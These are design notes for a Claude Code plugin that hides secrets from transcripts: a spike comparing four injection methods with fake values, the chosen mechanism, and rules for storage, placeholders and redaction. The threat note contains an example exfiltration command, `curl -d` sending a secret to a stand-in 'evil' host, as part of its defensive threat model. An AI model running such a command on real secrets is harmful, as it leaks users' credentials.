# M8 secret box: decisions

## D1. The spike (FR-SB-01)

Claude Code 2.1.296, Windows, Git Bash as the Bash tool's shell. One headless probe:

    python tools/probe.py --plugin bws-secrets-spike --prompt-file runs/2026-10-13-mods-m8-secrets/spike/prompt-1.txt \
      --settings runs/2026-10-13-mods-m8-secrets/spike/settings.json --model sonnet \
      --out runs/2026-10-13-mods-m8-secrets/receipts/spike-probe-1.json

The settings file only allows Bash (`permissions.allow: ["Bash"]`). The spike plugin (`spike/spike-register.ts`, a
temporary root folder `bws-secrets-spike/`, deleted after the probe and never committed) had four arms, one fake value
each. The model ran five commands, each with a `{{secret:NAME}}` placeholder. Fixture values were in
`C:/Users/bsmi0/AppData/Local/Temp/bws-m8-spike/secrets.env`, outside the project, as the real default
`~/.claude/bws-secrets/` is.

| Arm | Command gets the value by | Result scrubbed by |
|---|---|---|
| A | `tool.call` rewrite with the value inline: `export SPIKE_A='<value>'; ...` | nothing (the command prints no value) |
| B | `tool.call` rewrite that makes the shell read it: `export SPIKE_B="$(sed -n 's/^SPIKE_B=//p' '<file>')"; ...` | the `tool.call` hook: it awaits `next`, then returns its own `{ result }` (no `ref`, no `text`) |
| C | as B | only `session.append` (door `tool-result`) rewriting the row's `content` |
| D | `$.env.set('SPIKE_D', value)` before `next`, unset after; the command text reads `$SPIKE_D` | as B |

Evidence: `receipts/spike-probe-1.json` (the stream), `receipts/spike-probe-1-dump.json` (`$.session.messages()` rows and
API form, written by the spike at `turn.complete`), `receipts/spike-probe-1-greps.txt` (counts in all three records,
including the transcript file on disk, read only). Cost 0.155 USD.

| Fake value | stream-json | `$.session.messages` | transcript file |
|---|---|---|---|
| A `spkAAA-7731` | 0 | 0 | 0 |
| B `spkBBB-4402` | 0 | 0 | 0 |
| B as base64 `c3BrQkJCLTQ0MDI=` | 0 | 0 | 0 |
| C `spkCCC-9915` | 1 | 0 | 1 |
| D `spkDDD-5068` | 0 | 0 | 0 |
| text `export SPIKE` (any rewritten command) | 0 | 0 | 0 |

The dump and stream contain no fake value except C's, by design of that arm. A value that appears in a receipt of this
spike is a fake one.

### Answers
1. **Can a `tool.call` rewrite put the real value into a Bash command's environment without it reaching the transcript,
   the tool input log or the tool result?** Yes. Every arm's command ran with the variable set (A printed `A-set`; B, C
   and D echoed the value, which the scrub then replaced). The engine records the model's own `tool_use` input
   (`message.content[].input` and `wireToolInputs` hold `echo "B=[{{secret:SPIKE_B}}]"`), never the rewritten command:
   no `export SPIKE` text appears in any record.
2. **Can a "`tool.result` rewrite" redact an echoed value?** There is no `tool.result` event in 2.1.296. The two places
   are: (a) the `tool.call` hook after `next(e)` resolves, returning its own `{ result }`: core maps it for the model
   and stores it as the tool's result, both the `tool_result` block and the structured `toolUseResult` (B, D: clean
   everywhere); (b) `session.append` on door `tool-result`: it rewrites only the row's `content`. The structured record
   is "stored as made" (types), and the probe shows it: C's `toolUseResult.stdout` kept `C=[spkCCC-9915]` in the
   transcript file and the stream. So (b) alone leaks. The mod uses (a).
3. **What the engine records of the original versus the rewritten input:** only the original (the model's). The
   rewritten input reaches the permission check and the tool, not the record. Not checked headless: what the
   interactive permission prompt and the transcript's tool row draw for a rewritten call (MANUAL-CHECKS).

### Decision: mechanism B
The Bash command is rewritten to read each value from the secrets file in the shell, at execution time:

    export NAME="$(sed -n 's/^NAME=//p' '<secretsDir>/<project>.env')"; <the command, placeholder -> ${NAME}>

The value never passes through the engine, a hook's event, the command line of the spawned shell, or any record. The
tool's result is scanned in the `tool.call` hook after `next` and every occurrence of the value or its encodings is
replaced by `{{secret:NAME}}` before core stores it.

Why not the others:
- A puts the value in the rewritten command. That command is not recorded, but it is what the permission prompt shows,
  what the shell's own error messages quote (a syntax error prints the line), and what other processes can see on the
  shell's command line.
- C leaks through the structured record (above).
- D works, but `$.env.set` needs a literal name (so one fixed variable would carry every value), and between set and
  unset every process Claude Code starts inherits the value: a parallel Bash call, another plugin's `$.process.run`, an
  MCP server started then, and the whole time a permission prompt waits. B has no such window.

## D2. Threat note
What B protects: the value does not reach the model, the transcript file, the stream, `$.session.messages()`, or the
tool's stored result, for a Bash call that uses the placeholder. What it does not protect (README's threat model):
- A command that sends the value somewhere (`curl -d "$NAME" https://evil`): the shell runs what Claude wrote.
- A command that transforms the value into a form the scan does not know (reversed, split, encrypted, an encoding not
  in the list) and prints it.
- A file the user points Claude at, or a file a command writes the value into (`echo "$NAME" > out.txt`, then Read).
- Reads of the secrets folder by tools other than Read, Grep, Glob and Bash (the spec's list), such as PowerShell, and
  Bash commands that reach the folder without naming its path (a recursive search of a parent folder, a variable built
  at run time).
- Anyone with access to the user's account: the file is plain text (dotenv) in the user's home.
- A background Bash command's later output is not passed through the scan, so a placeholder command with
  `run_in_background: true` is refused (D5).

The scrub must fail closed, not open: a failure in the redaction after the command ran returns `{ deny }` (the model
reads only that a plugin withheld the result); a failure before `next` refuses the call. FR-ALL-03's fail-open rule is
for classifiers and forks; here FR-SB-01's "never a leaky version" governs. Registered with `.catch` as the types advise.

## D3. Storage
`<secretsDir>/<project>.env`, default `secretsDir` = `~/.claude/bws-secrets` (outside the project). `<project>` is the
session's working directory turned into a file name the way Claude Code names its project folders (every character
outside `[A-Za-z0-9]` becomes `-`), so two projects with the same folder name do not share a file. Lines are dotenv
`NAME=value`, one per name, written with LF; a value is one line (no CR or LF). Names: `^[A-Z][A-Z0-9_]{0,63}$`, not a
shell or system variable the export would clobber (`PATH`, `HOME`, ...).

## D4. Placeholder replacement
`{{secret:NAME}}` becomes `${NAME}` inside double quotes, `"${NAME}"` outside quotes (no word splitting), and
`'"${NAME}"'` inside single quotes (closes the quote, expands, reopens). `${NAME}` (not `$NAME`) so a placeholder followed
by a letter or underscore stays one name. A placeholder naming an unsaved name refuses the call and tells Claude to call
`request_secret`.

## D5. Edges
- `run_in_background: true` with a placeholder: refused (its output arrives later, outside this hook).
- A result the engine persisted to a file because it was large (`persistedOutputPath`): that file is scrubbed in place
  with `$.fs.read`/`$.fs.write` before the result returns.
- Encodings scanned: the raw value, base64 and base64url (with and without padding), percent-encoding, hex (lower and
  upper case). Values shorter than 4 characters are not scanned for encodings (too many false hits); the raw value is.

## D6. Waiting for the person inside `request_secret` (spike 2, during T03)
A hook's budget is 10 s of its own time; the clock stops only while a `$` call (other than a `$.clock` wait) is in
flight. `request_secret` has to wait for the person to type. Probe 2 (`receipts/spike-probe-2.json`, sonnet, 0.146 USD,
settings allowing the two spike tools):
- `wait_plain`, a hook awaiting a plain promise that a `$.clock.after(15 s)` callback resolves: the hook was dropped at
  its budget; the model read "registered the tool wait_plain but no tool.call hook answered this call".
- `wait_proc`, a hook looping on `$.process.run` of a ~1 s sleeper (`ping -n 2 127.0.0.1` on Windows, `sleep 1`
  elsewhere): answered after 15,775 ms, 15 sleeps.

Decision: the tool's hook waits by looping on a one-second sleeper process, checking for the person's answer between
sleeps; it stops at the answer, at `next.signal` (the person interrupted), or after 10 minutes. A sleeper that fails to
start ends the wait with a refusal (no answer), never a hang.

## D7. The masked entry
`Input` has no mask, and it draws what the person types until the hook redraws (an echo), and other plugins can match
its `ui.input`. So the entry is a `Client` surface module (`hooks/entry.ts`, terminal and desktop): it keeps the typed
characters in its own local state, draws one `•` per character, and on Enter posts the value once to this plugin's
`ui.message` (only this plugin's hooks see it). A `Client` gets keys after a click on its region (types: "reached while
a click has given it the focus"), so the pane says "click the box, type, press Enter". Surfaces without `Client`
(mobile, VS Code) and headless runs get no pane: a name already saved is reused (`saved as NAME; ...`); otherwise the
call is refused with a note that the person must run it in a terminal or desktop session.
